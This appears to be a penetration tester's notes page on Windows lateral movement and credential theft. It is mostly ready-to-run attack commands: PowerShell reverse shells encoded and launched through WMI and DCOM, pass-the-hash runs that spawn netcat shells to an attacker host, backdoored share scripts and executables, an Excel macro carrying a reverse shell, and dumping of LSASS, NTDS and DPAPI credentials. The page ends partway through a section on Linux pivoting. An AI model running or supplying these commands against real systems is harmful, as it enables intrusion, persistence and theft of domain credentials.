# Lateral Movement

{% embed url="https://hackmag.com/security/lateral-guide/" %}

{% code overflow="wrap" fullWidth="true" %}
```csharp
##### WMI
# Need credentials of a member of the Administrators local group or domain user
wmic /node:$TARGET_IP /user:pepe /password:Pass123! process call create "calc"
# PS variant is PSCredential
$username = 'jen'; 
$password = 'Nexus123!'; 
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString; 
# Then creating a new CimSession
$options = New-CimSessionOption -Protocol DCOM 
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
# We could replace this to get a reverse shell, but first we encode the PS revshell
import sys 
import base64
payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out- String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
# Then we run the Python script to retrieve the output
python3 encode.py
# Now the whole PS WMI script
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString; 
$options = New-CimSessionOption -Protocol DCOM 
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'powershell -nop -w hidden -e ABzA...yH';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

#### WINRM 
winrs -r:$TARGET_HOSTNAME -u:$USER -p:$PASS "cmd /c hostname & whoami & powershell -nop -w hidden -e JA...MA" # only works for domain users part of Administrator or Remote Management Users
# PowerShell Remoting
$username = 'jen'; 
$password = 'Nexus123!'; 
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString; 
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
PS C:\Users\jeff> Enter-PSSession 1 
[192.168.50.73]: PS C:\Users\jen\Documents> whoami 
corp\jen

#### PSEXEC (the user that authenticates on the target machine needs to be part of the Administrators local group)
./PsExec64.exe -i \\$TARGET_HOSTNAME -u $domain\$USER -p $PASS cmd

##### PASS THE HASH
wmiexec -hashes :$HASH Administrator@192.168.1.150

###### OVERPASS THE HASH (gain TGT to obtain TGS)
mimikatz # sekurlsa::pth /user:$USER /domain:dom.com /ntlm:$HASH /run:powershell
klist # no cached tickets
net use \\hostname # authenticate using interactive login to cache a ticket
klist # if there is one ticket, we converted NTLM hash into Kerberos TGT
.\PsExec.exe \\hostname cmd

###### PASS THE TICKET (takes advantage of the TGS which may be re-injected elsewhere on the network)
mimikatz #sekurlsa::tickets /export
dir *.kirbi
mimikatz # kerberos::ptt [0;12bd0]-...-user@cifs-web.kirbi # inject any TGS ticket belonging to the other user we want to authenticate
klist
ls \\web\folder # now if this user (and therefore the ticket) has access to the resourced, we should have granted access by impersonating that user

######## DCOM
https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
# Technique based on Microsoft Management Console (MMC) COM application that is employed for scripted automation of Windows systems
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgId("MMC20.Application.1", "$TARGET_IP"))
# Executing a command on the remote DCOM object
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e ...","7")
```
{% endcode %}

## DCSync (impersonate a DC)

[#dcsync](windows/persistence.md#dcsync "mention")

[#dcsync](windows/ad/#dcsync "mention")

{% code overflow="wrap" fullWidth="true" %}
```bash
# Possible by members of the Domain Admins, Enterprise Admins, and Administrators groups
# Or by a "custom" user with Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights
mimikatz # lsadump::dcsync /user:domain\pepe # provide the domain username for which we want to obtain credentials
lsadump::dcsync /user:corp\Administrator
# Copy NTLM hash and crack it
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
# We could retrieve the Administrator hash
mimikatz # lsadump::dcsync /user:domain\Administrator
impacket-secretsdump (-just-dc-user pepe) domain.com/someadmin:"PassUnexplicable2023\!"@10.10.10.10
```
{% endcode %}

## Administrators and UAC

[https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)

Differences between local accounts part of the local Administrators group and domain accounts part of the local Administrators group. Local accounts might be restricted for some techniques with full admin privileges over SMB, WinRM, etc. (except RDP GUI which counts with full rights). In these cases UAC has to be bypassed or the security feature has to be disabled.

## Spawning Processes Remotely

{% code overflow="wrap" fullWidth="true" %}
```powershell
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
# WinRM
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
# WinRM with PowerShell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
# Remotely Creating Services Using sc
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
# Creating Scheduled Tasks Remotely
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "THMtask1" 
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```
{% endcode %}

## WMI

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Connecting to WMI From Powershell (Common for all cases below)
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop

# Remote Process Creation Using WMI
 $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
# On legacy systems, the same can be done using wmic from the command prompt:
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 

# Creating Services Remotely with WMI
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
# Handle and start the service
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
# Stop and delete the service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete

# Creating Scheduled Tasks Remotely with WMI
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
# To delete the scheduled task after it has been used
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"

# Installing MSI packages
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi # same in legacy systems
```
{% endcode %}

## Alternate Authentication (no need to know user's password)

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Pass-the-Hash
# Extracting NTLM hashes from local SAM (only hashes from local users)
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
# Extracting NTLM hashes from LSASS memory (hashes for local users and any domain user recently logged on the machine)
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::msv
# PTH with Mimikatz
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
# PTH with Linux
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH

# Pass-the-Ticket (needs ticket and session key, to extract TGT we would need administrator's creds)
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
klist

# Overpass-the-hash / Pass-the-Key
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
# Depending on the encryption keys (RC4 is NTLM)
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com (/rc4|/aes128|/aes256):96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
{% endcode %}

## Abusing User Behaviour

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Writable Shares
If we, as attackers, have write permissions over scripts or executables on network shares, we can backdoor them to force users to execute any payload we want.
# Backdooring .vbs Scripts
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
# Backdooring .exe Files
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
# RDP hijacking (if SYSTEM privileges on elevated prompt on Windows Server 2016 and earlier)
PsExec64.exe -s cmd.exe
query user # better to choose disconnect (Disc.) to not log out actual users
tscon 3 /dest:rdp-tcp#6 # tscon $ID /dest:$OUR_CURRENT_SESSIONNAME, probably the only one which appears
```
{% endcode %}

## Pass the hash

{% code overflow="wrap" fullWidth="true" %}
```bash
# Pass the Hash (authenticate using user's NTLM hash)
https://github.com/byt3bl33d3r/pth-toolkit
https://juggernaut-sec.com/pass-the-hash-attacks/
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts

smbclient \\\\$IP\\$share -U Administrator --pw-nt-hash 7a5740...4b
evil-winrm -i 10.10.3.99 -u Administrator -H e4876a80a723612986d7609aa5eb
# if we happened to have our scripts located at /opt/scripts, we could include them in the connection with:
evil-winrm -u USERNAME  -p PASSWORD -i IP -s /opt/scripts
# Good folder /usr/share/powershell-empire/data/module_source/situational_awareness/network
evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

pth-winexe -U $DOMAIN/$USER%$NTLM_HASH //$IP $COMMAND # full hash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.222 cmd

psexec.py Administrator@10.11.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f381153b435b5

# Checking Pass The Hash works
crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth
# If there is prevention to log in as Administrator via RDP w/o password, execute this command
crackmapexec smb 172.16.1.200 -u Administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```
{% endcode %}

## Overpass the Hash

"Over" abuse a NTLM user hash to gain Kerberos TGT or service ticket.

{% code overflow="wrap" %}
```bash
https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
mimikatz > sekurlsa::logonpasswords # note if there is NTLM hash of cached passwords
mimikatz > sekurlsa::pth /user:admin /domain:dom.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
# Now on Powershell we issue a command that requires domain permissions such as net use
PS > net use \\dc01
# If we check Kerberos tickets, we should have some
PS > klist 
# We converted NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication
PS > .\PsExec.exe \\dc01 cmd.exe
# We reused the TGT created to obtain code execution on the domain controller above
```
{% endcode %}

## Pass the Ticket

Forge our own TGS to use that SPN on any multiple servers where the service is present.

{% code overflow="wrap" %}
```bash
whoami
domain\lowuser
# verify that we are unable to access the resource on WEB04
PS C:\Windows\system32> ls \\web\backup
ls : Access to the path '\\web\backup' is denied.
mimikatz #privilege::debug
Privilege '20' OK
# export all the TGT/TGS from memory
mimikatz #sekurlsa::tickets /export
# We can verify newly generated tickets with dir, filtering out on the kirbi extension
PS C:\Tools> dir *.kirbi
# Pick any TGS ticket referred to hostname/resource desired and inject it through Mimikatz
mimikatz # kerberos::ptt [0;12bd0]...user@cifs-web.kirbi
# we should expect the ticket in our session when running klist.
PS C:\Tools> klist
# Let's confirm we have been granted access to the restricted shared folder
PS C:\Tools> ls \\web\backup

# Obtain SID
whoami /user #SID defining the domain is the string except the RID at the end (last -XXXX)
# Flush Kerberos tickets
mimikatz > kerberos::purge
# Check there are no Kerberos tickets
mimikatz > kerberos::list
# Craft a Silver Ticket --- /rc4 is the password hash of the service account (IIS, MSSQL, etc.)
mimikatz > kerberos::golden /user:usuario /domain:dom.com /sid:$SID /target:web.dom.com /service:HTTP /rc4:E2B4... /ptt
kerberos::list
# With this ticket loaded into memory, we can gain access to any information based on the group memberships of the ticket
```
{% endcode %}

## PsExec.exe

Useful for pivoting if we have access to the pivot machine and have credentials of another machine of the subnet. It allows you to execute processes on a remote system and redirect output to the local system.

Psexec is different with Overpass the hash - in Psexec you're using NTLM authentication on a machine, whereas Overpass the hash you're using the hash to obtain a kerberos TGT and authenticating via kerberos.

A machine might only allow access via kerberos, so psexec would not work.

```bash
https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
https://www.itprotoday.com/windows-server/psexec-explainer-mark-russinovich
# The following command launches an interactive command prompt on \\marklap:
psexec -i \\marklap cmd
# Copy the program test.exe to the remote system and executes it interactively:
psexec -i \\marklap -c test.exe
```

## smbclient.py

```bash
smbclient.py user@IP -hashes :$NT_HASH
# shares
# use $SHARE
# dir
# cat file.txt
# get file.exe
```

## Dump hashes

[https://github.com/Offensive-Panda/ShadowDumper](https://github.com/Offensive-Panda/ShadowDumper)

{% hint style="info" %}
{% code overflow="wrap" %}
```
DCC2 (Domain Cached credentials 2) cannot be used for PTH and have to be cracked; hash is long and hard to break though.
```
{% endcode %}
{% endhint %}

### LSASS / lsassy / LSA Dump

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">#### Dump it even if Defender removes it > use quarantine encrypted file to decrypt it with old leaked keys
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
https://raw.githubusercontent.com/malmoeb/DFIR/refs/heads/master/quarantine.py


nxc smb $IP -u USER -p pass --loggedon-users
nxc &#x3C;protocol> &#x3C;target(s)> -u Administrator -p 'P@ssw0rd' -M lsassy

reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\share'
# backup all SAM, SYSTEM and SECURITY hives at once
reg.py "domain"/"user":"password"@"target" backup -o '\\ATTACKER_IP\someshare'
secretsdump -security SECURITY.save -system SYSTEM.save LOCAL
<strong>
</strong><strong>cme ... (--local-auth) --lsa
</strong>
# lsassy - Extract credentials from lsass remotely
https://github.com/Hackndo/lsassy
lsassy -u $USER -H $NTLM_HASH $IP
lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.0

# PTH attack using lsassy to dump LSASS process 
https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
lsassy -u administrator -H 3542d79d5d17bc9d3014d4d56b5e1050 172.16.1.100

# LSASS manual way (Extract hashes without using Mimikatz!)
https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf
https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/
    Dump the hashes using pypykatz abuse lsass.exe
    (note: the shell you're in must have administrative wrights)
# BEST WAY
	procdump.exe -ma lsass.exe lsass.dmp #Windows target
        pypykatz lsa minidump lsass.dmp  #attacking machine
# ALTERNATIVE
    First get the lsass process Id w/ Powershell
    get-process lsass
    (use native dlls and lsass.exe PID to generate a .dmp file)
    C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump C:\Users\administrator.xor\Desktop\lsass.dmp full
    (now download it to your kali vm and use pypykatz)(make sure the file stay the same , sometime they get corrupt)
</code></pre>

### NTDS.dit

```bash
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync
https://www.puckiestyle.nl/extracting-password-hashes-from-the-ntds-dit-file/
https://pentestlab.blog/tag/ntds-dit/

# ntds.dit - Domain Controller Synchronization (DCSync) 
# Steal a copy of the NTDS.dit database file (copy of all AD accounts)
lsadump::dcsync /user:Administrator

# AS SOON AS WE GET THE DC, DUMP NTDS
cme smb $DC_IP -u Administrator -p 'P@$$w0rd!' -M ntdsutil
cme smb $DC_IP -u Administrator -p 'P@$$w0rd!' --ntds vss

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### secretsdump / Mimikatz

{% hint style="info" %}
In case of Powershell shell or if it shows mimkatz lots of times use one-liners such as

```powershell
mimikatz.exe "token::elevate" "privilege::debug" "sekurlsa::logonpasswords" "vault::list" "lsadump::sam" "lsadump::secrets" "exit"
```

or use Invoke-Mimikatz
{% endhint %}

{% code overflow="wrap" %}
```bash
secretsdump.py -user-status -history -pwd-last-set
# For 3 reasons:
- It shows password history so in case we change a password, we could revert it to the previous hash and do not alert the users of that change
- We can use old passwords to build hashcat rules and crack other passwords
- We see if the account is enabled/disabled so we will know immediately if we can leverage a hash or not

secretsdump.py $DOMAIN/$USER:$PASS@DOMAIN
# Also -history parameter is good to catch old/previous passwords
# EXAMPLE
cme smb 10.10.10.0 -u 'Administrator' -p 'MyPass123@' (-d domain) --sam
python secretsdump.py spookysec.local/backup:backup2517860@spookysec.local
secretsdump.py -just-dc -no-pass DC01$:@10.10.183.129
# If we get a hash like this:
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4876a80a723612986d7609aa5ebc12b:::
# Previous hash --> NTLM hash e4876a80a723612986d7609aa5ebc12b
# The second hash is the NTLM hash. We can use Hashcat to crack it:
hashcat -m 1000 -a 0 hash rockyou.txt

https://salarbakhtiari.medium.com/extracting-credentials-from-memory-with-lsa-protection-proctected-process-light-enabled-2064af4258bd

# MIMIKATZ
https://github.com/gentilkiwi/mimikatz
# Mimikatz alternative link if there is any problem with the version
https://gitlab.com/kalilinux/packages/mimikatz/-/commit/3100a45278237cb7f87ef28f7edbfef4135c615c
# Run cmd.exe as administrator
privilege::debug # Get debug privilege *run as administrator)
token::elevate # elevate our integrity to SYSTEM level
token::list
lsadump::sam # dump all of the SAM local password hashes
lsadump::lsa /patch
# OTHER TOOLS
pwdump
fgdump
Windows Credential Editor (wce)
# CRACK THOSE HASHES
hashcat -m 1000 <hash> rockyou.txt
```
{% endcode %}

### Bypass LSA Protection (Protected Process Light enabled)

```
# On Mimikatz
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```

### DPAPI

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#retrieving-masterkey-with-users-password
<strong>
</strong># Check for credentials C:\Users\$User\AppData\Roaming\Microsoft\Credentials even for hidden files
# If there are credentials, look for masterkeys AppData\Roaming\Microsoft\Protect\[sid]
# First, decrypt the masterkey
dpapi.py masterkey -file $MASTERKEY_FILE -sid S-1-5-21-...-1115 -password $pwd
...
key with User Key (MD4 protected)
Decrypted key: 0x55d51b...989f
# Then use that key to decrypt the credential
dpapi.py credential -file $CREDENTIAL_FILE -key 0x55d51b...989f
# If you have several masterkeys, try all
<strong>
</strong><strong># Identify available credential files and masterkeys (replace user) 
</strong>cmd​ /c "​dir​ /S /AS C:\Users\security\AppData\Local\Microsoft\Vault &#x26; ​dir​ /S /AS C:\Users\security\AppData\Local\Microsoft\Credentials &#x26; ​dir​ /S /AS C:\Users\security\AppData\Local\Microsoft\Protect &#x26; ​dir​ /S /AS C:\Users\security\AppData\Roaming\Microsoft\Vault &#x26; ​dir​ /S /AS C:\Users\security\AppData\Roaming\Microsoft\Credentials &#x26; ​dir​ /S /AS C:\Users\security\AppData\Roaming\Microsoft\Protect"
<strong>
</strong>
# MIMIKATZ -> If we hit AV/EDR, download files and use them offline w/ Mimikatz on our Win VM
# WE FIRST EXTRACT THE guidMasterKey (/in: is uppercase inside)
mimikatz # dpapi::cred /in:D7...F1
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : ...
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {99...-...-...-...-7d}
...

# Retrieving MasterKey with User's Password, we need as well SID of that user (/protected is optional and might be necessary)
mimikatz # dpapi::masterkey /in:99...-...-...-...-7d /sid:S-1-5-...-1000 /password:MyPass /protected
**MASTERKEYS**
...
[masterkey] with password: MyPass (protected user)
  key : ac2...
  sha1: ...
    
# Having that key, we can decrypt file under /Credentials (uppercase alphanumeric)
mimikatz # dpapi::cred /in:A1...F7
**BLOB**
...
  UserName       : domain.com\admin
  CredentialBlob : SuperSecurePassword
  Attributes     : 0
<strong>
</strong><strong>
</strong><strong># It will get all secrets from Credential Manager, Chrome, Edge, Firefox
</strong># You need at least local admin privilege on the remote target
nxc smb &#x3C;ip> -u user -p password --dpapi
nxc smb &#x3C;ip> -u user -p password --dpapi cookies
nxc smb &#x3C;ip> -u user -p password --dpapi nosystem


# Alternative -> check SharpDPAPI.exe from here
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
https://github.com/login-securite/DonPAPI
</code></pre>

### NTLMv2

[https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html)

{% hint style="info" %}
NTLMv2 cannot be used for pass-the-hash but can be cracked.
{% endhint %}

### Domain Cached Logon Crack

<pre class="language-bash"><code class="lang-bash"><strong># Domain Cached Logon Cracking DCC2 or MACHACHE2/MSCASH2
</strong><strong>https://www.hackingarticles.in/credential-dumping-domain-cache-credential/
</strong>DOMAIN.COM/Administrator:$DCC2$10240#Administrator#f59ffc1c8261922618d5d4f1ad2b22cc
hashcat -m 2100 hashes rockyou.txt --username
</code></pre>

## Pass The Certificate (Cert -> NTLM or TGT)

{% code overflow="wrap" fullWidth="true" %}
```bash
# If vulnerable template (case ESC1 for example) we can request a certificate
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
#     With certipy we can request the ntlm hash of the user and the TGT too
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```
{% endcode %}

## Getting Windows shell

| [https://www.hackingarticles.in/remote-code-execution-using-impacket/](https://www.hackingarticles.in/remote-code-execution-using-impacket/)                                                                                                                                                                                                               |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [tps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Using%20credentials.md#remote-code-execution-with-ps-credentials](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Using%20credentials.md#remote-code-execution-with-ps-credentials) |

{% code overflow="wrap" %}
```bash
smbexec.py DOMAIN/username:password@10.10.10.10
winexe -U DOMAIN/username%password //10.10.0.0 cmd.exe
psexec.py domain/username:password@hostIP
psexec.py s4vicorp.local/Administrator:P@\$\$w0rd\!@10.0.2.44 cmd.exe

# winexe is more stealthy than psexec.py
# dcomexec.py no AV detection
# atexec.py is also a good option, no AV detection

# A semi-interactive shell, used through Windows Management Instrumentation.
python wmiexec.py DOMAIN/username:password@10.10.10.10
wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
```
{% endcode %}

### SCShell

```bash
https://github.com/Mr-Un1k0d3r/SCShell
# We need RPC port 135 open
# Good option if PSExec.exe, psexec.py, smbexec.py are detected by the AV
python3 scshell.py user@$IP
```

{% hint style="info" %}
Some tools like crackmapexec, Impacket’s mssqlclient allow you to specify whether you want a Windows login or a local one. The difference is that a local auth doesn’t require the credentials to be a Windows one, it could exist just for the service such as MS-SQL. If you find credentials try it for both. Look out for something like _**`--local-auth`**_ in the options.
{% endhint %}

## DCOM (Distributed Component Object Model)

Related to Microsoft Office Outlook and PowerPoint.

With this technique we could gain access to an internal machine.

{% code overflow="wrap" %}
```powershell
https://learn.microsoft.com/en-us/office/vba/api/Excel.Application.Run
https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/
https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/

Requirements:
- Microsoft Office installed on the target so best suitable for workstations (and we will also install it on our Windows VM for the attack)
- Access to both TCP 135 for DCOM and TCP 445 for SMB (they should be open on the target)
- Being local admin on that target machine
We will leverage the Excel.Application DCOM object in this example (change Excel for Outlook, PowerPoint...)
# Code to create DCOM object and enumerate methods
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "$DC_IP"))
$com | Get-Member #We should see Run method to continue (allow us to execute a VBA macro remotely)
# Now we create a PoC of Excel file with notepad.exe or ping.exe as VBA macro
Sub mymacro()
    Shell ("ping.exe 192.168.1.111") #second interface of the DC_IP to be able to reach it externally
End Sub
# Copy the .xls file to the remote computer
$LocalPath = "C:\Users\user.corp\myexcel.xls"
$RemotePath = "\\$DC_IP\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
# Creating SYSTEM profile folder
$Path = "\\DC_IP\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
# Open the book
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
# Run VBA Macro
$com.Run("mymacro")
# After executing this PoC, we use the real payload with LHOST=IP of W10 client's 2nd network interface so DC can call back can call back to our Netcat listener
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
# Next, we extract the line starting with "powershell.exe -nop -w hidden -e" followed by the Base64 encoded payload and use this simple Python script to split the command into smaller chunks, bypassing the size limit in Excel macros:
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
n = 50
for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
# We update our Excel macro to execute PowerShell and repeat the actions to upload it to the DC and execute it.
Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    ...
    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
    Shell (Str)
End Sub
# Start a Netcat listener on the W10 client to accept the revshell from the DC
PS > nc.exe -lvnp 4444
```
{% endcode %}

## Windows Management Instrumentation

{% embed url="https://learn.microsoft.com/en-us/windows/win32/winrm/portal?redirectedfrom=MSDN" %}

## Powershell Remoting

{% hint style="info" %}
PowerShell Remoting by default uses WinRM for Cmdlets such as Enter- PSSession. Therefore, a user needs to be in the local group Windows Management Users to be a valid user for these Cmdlets. However, instead of WinRM, SSH can also be used for PowerShell remoting.
{% endhint %}

{% embed url="https://www.trustedsec.com/blog/no_psexec_needed/" %}

## Stable Pivot Point (Linux)

{% code overflow="wrap" %}
```bash
# THE COMMANDS HAVE TO BE ISSUED FROM A NON-INTERACTIVE SHELL SUCH AS METERPRETER SHELL (set payload linux/x86/meterpreter/reverse_tcp)
#OTHERWISE IT WILL NOT WORK IN CASES SUCH AS FULLY INTERACTIVE TTY SHELL

# automatically accept the host key of our Kali machine
